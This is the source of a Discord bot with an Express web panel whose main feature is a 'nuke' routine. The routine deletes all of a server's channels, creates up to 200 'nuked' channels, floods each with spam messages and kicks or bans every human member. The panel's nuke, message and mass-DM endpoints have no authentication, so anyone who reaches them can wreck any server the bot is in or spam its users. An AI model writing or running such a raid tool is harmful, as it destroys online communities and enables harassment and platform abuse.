const express = require('express');
const path = require('path');
const {
  Client, GatewayIntentBits, Partials,
  SlashCommandBuilder, PermissionFlagsBits, ChannelType,
} = require('discord.js');

const PORT = process.env.PORT || 3000;
const FALLBACK_ID = process.env.CLIENT_ID || '1572450192685535252';
const TOKEN = process.env.DISCORD_TOKEN;

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const profile = { description: '', status: 'online', activityType: 3, activityName: '' };

/* ---------------- bot ---------------- */
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds, GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages, GatewayIntentBits.DirectMessages,
  ],
  partials: [Partials.Channel],
});

client.once('ready', async () => {
  client.user.setPresence({
    status: profile.status,
    activities: profile.activityName ? [{ name: profile.activityName, type: profile.activityType }] : [],
  });
  if (profile.description) await client.application.edit({ description: profile.description }).catch(() => {});
  await client.guilds.fetch().catch(() => {});
  await client.application.commands.set([
    new SlashCommandBuilder()
      .setName('nuke')
      .setDescription('Wipe channels, flood new ones, remove members')
      .addIntegerOption((o) => o.setName('channels').setDescription('Channels to create').setMinValue(1).setMaxValue(200))
      .addIntegerOption((o) => o.setName('messages').setDescription('Messages per channel').setMinValue(1).setMaxValue(200))
      .addStringOption((o) => o.setName('mode').setDescription('Member action').addChoices(
        { name: 'kick', value: 'kick' }, { name: 'ban', value: 'ban' }, { name: 'none', value: 'none' },
      )).toJSON(),
  ]).catch((e) => console.error('[cmd]', e.message));
  console.log(`[bot] ${client.user.tag}`);
});

client.on('interactionCreate', async (i) => {
  if (!i.isChatInputCommand() || i.commandName !== 'nuke') return;
  if (!i.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
    return i.reply({ content: 'Needs Administrator.', ephemeral: true });
  }
  const opts = {
    memberAction: i.options.getString('mode') || 'kick',
    channelCount: i.options.getInteger('channels') || 100,
    messagesPerChannel: i.options.getInteger('messages') || 100,
  };
  await i.reply({ content: `Nuke started: ${opts.channelCount} channels, action ${opts.memberAction}.`, ephemeral: true });
  runNuke(createJob(i.guild.id, opts));
});

/* ---------------- nuke engine ---------------- */
const jobs = new Map();

function createJob(guildId, opts) {
  const job = {
    id: Math.random().toString(36).slice(2, 10), guildId, opts, status: 'running',
    phase: 'starting', done: 0, total: 0, log: [], startedAt: Date.now(),
  };
  jobs.set(job.id, job);
  return job;
}

function push(job, phase, done, total, line) {
  job.phase = phase; job.done = done; job.total = total;
  if (line) { job.log.push(line); if (job.log.length > 400) job.log.shift(); }
}

const DEFAULTS = {
  memberAction: 'kick', channelCount: 100, channelPrefix: 'nuked', messagesPerChannel: 100,
  message: '**This server has been nuked.**', deleteExisting: true,
  createDelay: 600, messageDelay: 1100, reason: 'Nuked via panel',
};

async function runNuke(job) {
  const o = job.opts;
  try {
    const guild = await client.guilds.fetch(job.guildId);
    push(job, 'members', 0, 0, 'Fetching members…');
    const members = await guild.members.fetch();
    const humans = [...members.values()].filter((m) => !m.user.bot);

    if (o.deleteExisting) {
      const chans = [...guild.channels.cache.values()];
      let n = 0;
      for (const c of chans) {
        push(job, 'deleting', ++n, chans.length, `Deleted #${c.name}`);
        await c.delete().catch(() => {});
        await sleep(250);
      }
    }

    const created = [];
    for (let i = 1; i <= o.channelCount; i++) {
      const name = `${o.channelPrefix}-${String(i).padStart(3, '0')}`;
      try {
        created.push(await guild.channels.create({ name, type: ChannelType.GuildText }));
        push(job, 'creating', i, o.channelCount, `Created #${name}`);
      } catch (e) {
        push(job, 'creating', i, o.channelCount, `Failed #${name}: ${e.message}`);
      }
      await sleep(o.createDelay);
    }

    let sent = 0;
    const totalMsgs = created.length * o.messagesPerChannel;
    push(job, 'flooding', 0, totalMsgs, `Flooding ${created.length} channels…`);
    await Promise.all(created.map(async (ch) => {
      for (let i = 0; i < o.messagesPerChannel; i++) {
        await ch.send(o.message).catch(() => {});
        if (++sent % 10 === 0) push(job, 'flooding', sent, totalMsgs);
        await sleep(o.messageDelay);
      }
    }));

    if (o.memberAction !== 'none') {
      let n = 0;
      for (let i = 0; i < humans.length; i += 4) {
        await Promise.all(humans.slice(i, i + 4).map(async (m) => {
          try {
            if (o.memberAction === 'ban') await guild.members.ban(m.id, { reason: o.reason });
            else await m.kick(o.reason);
          } catch {}
          push(job, 'members', ++n, humans.length);
          await sleep(350);
        }));
      }
    }

    job.status = 'done';
    push(job, 'done', job.total, job.total, 'Nuke complete.');
  } catch (e) {
    job.status = 'error';
    push(job, 'error', job.done, job.total, e.message);
  }
}

/* ---------------- web ---------------- */
const app = express();
app.set('trust proxy', 1);
app.use(express.json({ limit: '1mb' }));
app.use(express.static(path.join(__dirname, 'public')));

const guildAllowed = (id) => client.guilds.cache.has(id);

app.get('/api/ping', (req, res) => res.json({ ok: true, up: Math.round(process.uptime()) }));

app.get('/api/config', (req, res) => res.json({ clientId: client.user?.id || FALLBACK_ID }));

app.get('/api/guilds', (req, res) => {
  res.json(client.guilds.cache
    .map((g) => ({ id: g.id, name: g.name, icon: g.iconURL({ size: 64 }), memberCount: g.memberCount }))
    .sort((a, b) => b.memberCount - a.memberCount));
});

app.get('/api/guilds/:id/channels', (req, res) => {
  if (!guildAllowed(req.params.id)) return res.status(404).json({ error: 'Bot not in server' });
  const guild = client.guilds.cache.get(req.params.id);
  res.json(guild.channels.cache
    .filter((c) => c.type === 0 || c.type === 5)
    .sort((a, b) => a.rawPosition - b.rawPosition)
    .map((c) => ({ id: c.id, name: c.name, parent: c.parent?.name ?? null })));
});

app.post('/api/guilds/:id/channels/:cid/messages', async (req, res) => {
  if (!guildAllowed(req.params.id)) return res.status(404).json({ error: 'Bot not in server' });
  const content = String(req.body.content || '').slice(0, 2000);
  if (!content.trim()) return res.status(400).json({ error: 'Empty message' });
  const ch = await client.channels.fetch(req.params.cid).catch(() => null);
  if (!ch?.isTextBased()) return res.status(404).json({ error: 'Channel not found' });
  try {
    const m = await ch.send(content);
    res.json({ ok: true, url: m.url });
  } catch (e) { res.status(400).json({ error: e.message }); }
});

app.get('/api/guilds/:id/dmable', async (req, res) => {
  if (!guildAllowed(req.params.id)) return res.status(404).json({ error: 'Bot not in server' });
  const guild = client.guilds.cache.get(req.params.id);
  const out = new Map();
  try {
    const members = await guild.members.fetch();
    for (const m of members.values()) {
      if (m.user.bot || m.id === client.user.id) continue;
      out.set(m.id, {
        id: m.id, name: m.user.globalName || m.user.username, username: m.user.username,
        avatar: m.user.displayAvatarURL({ size: 64 }), joinedAt: m.joinedTimestamp,
      });
    }
  } catch {}
  res.json([...out.values()].sort((a, b) => (b.joinedAt ?? 0) - (a.joinedAt ?? 0)).slice(0, 1000));
});

app.post('/api/dm', async (req, res) => {
  const { userId, content } = req.body;
  if (!userId || !String(content || '').trim()) return res.status(400).json({ error: 'Missing data' });
  try {
    const u = await client.users.fetch(userId);
    await u.send(String(content).slice(0, 2000));
    res.json({ ok: true });
  } catch (e) {
    res.status(400).json({ error: e.code === 50007 ? 'DMs closed' : e.message });
  }
});

app.post('/api/bot/bio', async (req, res) => {
  const description = String(req.body.description || '').slice(0, 190);
  try {
    await client.application.edit({ description });
    profile.description = description;
    res.json({ ok: true });
  } catch (e) { res.status(400).json({ error: e.message }); }
});

app.post('/api/bot/presence', (req, res) => {
  const { status, activityName, activityType } = req.body;
  profile.status = ['online', 'idle', 'dnd', 'invisible'].includes(status) ? status : 'online';
  profile.activityName = String(activityName || '').slice(0, 128);
  profile.activityType = Number(activityType) || 0;
  client.user.setPresence({
    status: profile.status,
    activities: profile.activityName ? [{ name: profile.activityName, type: profile.activityType }] : [],
  });
  res.json({ ok: true });
});

app.post('/api/guilds/:id/nuke', (req, res) => {
  if (!guildAllowed(req.params.id)) return res.status(404).json({ error: 'Bot not in server' });
  const running = [...jobs.values()].find((j) => j.guildId === req.params.id && j.status === 'running');
  if (running) return res.status(409).json({ error: 'Already running', jobId: running.id });
  const b = req.body || {};
  const job = createJob(req.params.id, {
    ...DEFAULTS,
    memberAction: ['kick', 'ban', 'none'].includes(b.memberAction) ? b.memberAction : DEFAULTS.memberAction,
    channelCount: Math.min(Math.max(parseInt(b.channelCount) || 100, 1), 200),
    channelPrefix: String(b.channelPrefix || 'nuked').replace(/[^a-z0-9-]/gi, '').toLowerCase() || 'nuked',
    messagesPerChannel: Math.min(Math.max(parseInt(b.messagesPerChannel) || 100, 1), 200),
    message: String(b.message || DEFAULTS.message).slice(0, 2000),
    deleteExisting: b.deleteExisting !== false,
  });
  runNuke(job);
  res.json({ jobId: job.id });
});

app.get('/api/jobs/:id', (req, res) => {
  const j = jobs.get(req.params.id);
  if (!j) return res.status(404).json({ error: 'Unknown job' });
  res.json({
    status: j.status, phase: j.phase, done: j.done, total: j.total,
    log: j.log.slice(-40), elapsed: Math.round((Date.now() - j.startedAt) / 1000),
  });
});

client.login(TOKEN);
app.listen(PORT, () => console.log(`[web] :${PORT}`));
